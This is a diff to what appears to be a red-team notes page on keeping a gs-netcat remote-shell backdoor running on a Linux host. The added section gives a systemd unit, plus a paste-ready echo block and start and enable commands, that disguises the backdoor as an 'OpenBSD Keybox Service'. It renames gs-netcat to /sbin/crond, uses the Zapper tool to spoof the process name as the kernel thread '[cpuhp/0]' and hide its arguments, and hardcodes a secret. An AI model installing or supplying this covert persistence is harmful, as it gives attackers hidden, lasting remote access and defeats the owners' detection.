@@ -54,7 +54,7 @@ gs-netcat -s MySecret
 gs-netcat -s -i MySecret
 ```
 
-### Persisting the Server systemd
+### Persisting the Server systemd (Not Hidden)
 
 * create secret file&#x20;
 
@@ -119,6 +119,65 @@ cat /etc/systemd/system/NetworkManage.service
 systemctl start NetworkManage.service
 systemctl enable NetworkManage.service
 systemctl status NetworkManage.service
+```
+
+* this is not great because the secret file path or the secret with -s will show up as \*\*\*\*\*\*\*\*\*\*\* in the process list
+
+### Persisting the Server systemd (Zapper)
+
+* Zapper is a great tool to hide your cmdline options
+* pull the tool from&#x20;
+* example service file, zapper is keybox and gs-netcat is crond in the below example
+* make sure it doesnt exist first&#x20;
+
+```
+ls -lartF /etc/systemd/system/keybox.service
+```
+
+```
+[Unit]
+Description=OpenBSD Keybox Service
+Documentation=man:keybox(8) man:keybox_config(2)
+After=network.target auditd.service
+
+[Service]
+Type=oneshot
+ExecStart=/usr/libexec/keybox -f -a '[cpuhp/0]' -n0 /sbin/crond -liqD -s abc123 &
+KillMode=process
+Restart=on-failure
+RestartPreventExitStatus=255
+
+[Install]
+WantedBy=multi-user.target
+Alias=keybox.service
+```
+
+* quick paste
+
+```
+echo "[Unit]" >> /etc/systemd/system/keybox.service
+echo "Description=OpenBSD Keybox Service" >> /etc/systemd/system/keybox.service
+echo "Documentation=man:keybox(8) man:keybox_config(2)" >> /etc/systemd/system/keybox.service
+echo "After=network.target auditd.service" >> /etc/systemd/system/keybox.service
+echo "" >> /etc/systemd/system/keybox.service
+echo "[Service]" >> /etc/systemd/system/keybox.service
+echo "Type=oneshot" >> /etc/systemd/system/keybox.service
+echo "ExecStart=/usr/libexec/keybox -f -a '[cpuhp/0]' -n0 /sbin/crond -liqD -s abc123 &" >> /etc/systemd/system/keybox.service
+echo "KillMode=process" >> /etc/systemd/system/keybox.service
+echo "Restart=on-failure" >> /etc/systemd/system/keybox.service
+echo "RestartPreventExitStatus=255" >> /etc/systemd/system/keybox.service
+echo "" >> /etc/systemd/system/keybox.service
+echo "[Install]" >> /etc/systemd/system/keybox.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/keybox.service
+echo "Alias=keybox.service" >> /etc/systemd/system/keybox.service
+```
+
+* after creating the service file (make sure to alter the key
+
+```
+systemctl start keybox.service
+systemctl enable keybox.service
+systemctl status keybox.service
 ```
 
 ### Command Console
